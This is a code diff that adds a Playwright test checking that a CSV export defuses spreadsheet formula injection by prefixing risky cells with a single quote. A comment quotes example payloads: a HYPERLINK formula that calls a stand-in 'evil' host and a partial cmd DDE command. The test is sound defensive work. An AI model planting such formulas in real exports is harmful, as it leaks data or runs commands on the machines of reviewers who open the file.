@@ -432,6 +432,83 @@ test.describe("email-delivery CSV export body @csv-export", () => {
     }
   });
 
+  test("recipients starting with =, +, -, or @ are prefixed with a single quote (formula-injection guard, CWE-1236)", async ({
+    request,
+  }) => {
+    // `csvCell` defuses spreadsheet formula injection by prefixing any
+    // cell whose first character is `=`, `+`, `-`, or `@` with a
+    // single quote. Without that prefix, a compliance reviewer who
+    // opens the downloaded CSV in Excel would execute whatever
+    // formula an attacker stuffed into an invitation email field —
+    // for example `=HYPERLINK("https://evil/?", "Click")` or
+    // `=cmd|...` — and leak data or fire a remote command.
+    //
+    // Seed one invitation per dangerous prefix, pull the CSV against
+    // the same far-future window the sibling body test uses (so other
+    // workspaces' rows can't bleed in), and assert each row's
+    // recipient cell begins with a literal `'`. The prefixes
+    // themselves are NOT csvCell quote-triggers (no comma / quote /
+    // newline), so each cell appears unwrapped in the row — meaning
+    // a literal `'<prefix>` substring is the right thing to look for.
+    const prefixes = ["=", "+", "-", "@"] as const;
+    const seeds: { prefix: string; recipient: string; invitationId: string }[] =
+      [];
+    try {
+      for (const prefix of prefixes) {
+        // Tag the local part with a UUID so we can locate this row
+        // unambiguously in the CSV body even though several seeded
+        // rows land in the same window.
+        const recipient = `${prefix}fi-${crypto.randomUUID()}@example.com`;
+        const seed = await seedInvitationFailureRow({
+          companyId,
+          ownerUserId,
+          recipient,
+          error: "smtp 550 mailbox unavailable",
+        });
+        seeds.push({ prefix, recipient, invitationId: seed.invitationId });
+      }
+
+      const res = await request.get(
+        `/api/auth/email-deliveries?format=csv` +
+          `&from=${SEED_WINDOW.from}&to=${SEED_WINDOW.to}`,
+        { headers: headers() },
+      );
+      expect(res.status()).toBe(200);
+      expect(res.headers()["content-type"]).toMatch(/^text\/csv/);
+
+      const body = (await res.body()).toString("utf8");
+      // Strip BOM, split on CRLF, drop the trailing empty line and
+      // the header row — what's left is the data rows.
+      const lines = body.slice(1).split("\r\n");
+      expect(lines[0]).toBe(CSV_HEADER);
+      const dataRows = lines.slice(1).filter((l) => l.length > 0);
+
+      for (const seed of seeds) {
+        // Locate this seed's row by its unique recipient suffix.
+        // The csvCell guard prepends a `'` to the recipient, but the
+        // unique uuid+`@example.com` portion stays intact.
+        const suffix = seed.recipient.slice(1); // drop the dangerous prefix
+        const row = dataRows.find((l) => l.includes(suffix));
+        expect(row, `expected a CSV row for ${seed.recipient}`).toBeDefined();
+        // The recipient is the second column. The cell is unquoted
+        // (no commas / quotes / newlines), so it appears as
+        // `,'<prefix><suffix>,` between the transport and status
+        // columns. Pinning to that exact framing catches a regression
+        // where the `'` prefix is dropped *or* leaks into the wrong
+        // column.
+        const expectedCell = `,'${seed.prefix}${suffix},`;
+        expect(
+          row,
+          `recipient cell for ${seed.recipient} must start with a single quote`,
+        ).toContain(expectedCell);
+      }
+    } finally {
+      for (const seed of seeds) {
+        await deleteSeededInvitation(seed.invitationId);
+      }
+    }
+  });
+
   test("empty result set still returns the header row + trailing CRLF", async ({
     request,
   }) => {
